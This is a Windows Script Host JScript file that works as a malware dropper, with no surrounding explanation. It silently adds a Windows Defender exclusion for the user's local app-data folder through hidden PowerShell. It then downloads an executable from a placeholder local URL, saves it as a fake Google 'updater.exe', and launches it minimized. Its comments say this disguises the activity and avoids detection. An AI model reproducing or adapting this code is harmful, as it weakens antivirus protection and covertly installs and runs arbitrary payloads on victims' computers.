var fso = new ActiveXObject("Scripting.FileSystemObject");
var appDataPath = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LOCALAPPDATA%");
var googleDirectory = appDataPath + "\\Google";
var targetDirectory = googleDirectory + "\\136.0.7079.0";
var updaterFile = targetDirectory + "\\updater.exe";

// Function to add an exclusion to Windows Defender via PowerShell
function addAntivirusExclusion() {
    var psCommand = 'powershell -Command "Add-MpPreference -ExclusionPath \'' + appDataPath + '\'"';
    try {
        var shell = new ActiveXObject("WScript.Shell");
        // Run PowerShell command silently
        shell.Run(psCommand, 0, true); // 0 means hidden, true means wait for completion
    } catch (e) {
        // If needed, handle errors silently
    }
}

// Add antivirus exclusion before proceeding (silently)
addAntivirusExclusion();
WScript.Sleep(4000); // 10000 milliseconds = 10 seconds

// Check if the updater.exe file exists
if (!fso.FileExists(updaterFile)) {
    // If the file doesn't exist, check if the target directory exists
    if (!fso.FolderExists(targetDirectory)) {
        try {
            // Create the necessary folders if they don't exist silently
            fso.CreateFolder(googleDirectory);
            fso.CreateFolder(targetDirectory);
        } catch (e) {
            // Handle any errors silently
        }
    }

    // Download the file from the given URL and save it directly to updater.exe
    try {
        var url = "http://127.0.0.1/1.exe"; // Ensure this URL is legitimate and not flagged
        var stream = new ActiveXObject("ADODB.Stream");
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");

        // Open HTTP connection
        xhr.open("GET", url, false); // false means synchronous request

        // Set cache control headers to prevent caching
        xhr.setRequestHeader("Cache-Control", "no-cache");
        xhr.setRequestHeader("Pragma", "no-cache");
        xhr.setRequestHeader("Expires", "0");

        xhr.send();

        if (xhr.status == 200) {
            // Use ADODB.Stream to write the file directly to the specified location
            stream.Open();
            stream.Type = 1; // Binary
            stream.Write(xhr.responseBody); // Write the file content directly to the stream
            stream.Position = 0; // Reset the position to the beginning of the stream
            stream.SaveToFile(updaterFile, 2); // 2 means overwrite the file if it already exists
            stream.Close();
        }
    } catch (e) {
        // Handle any download errors silently
    }
}
// Instead of running directly, use cmd.exe to run the updater.exe to mimic normal behavior
try {
    var shell = new ActiveXObject("WScript.Shell");
    // Running updater.exe via cmd (with a delay and silent execution)
    shell.Run("cmd /c start /min " + updaterFile, 0, false); // "/min" minimizes the cmd window, making it less noticeable
} catch (e) {
    // Handle any errors silently if updater.exe cannot be executed
}

// Close the script
WScript.Quit();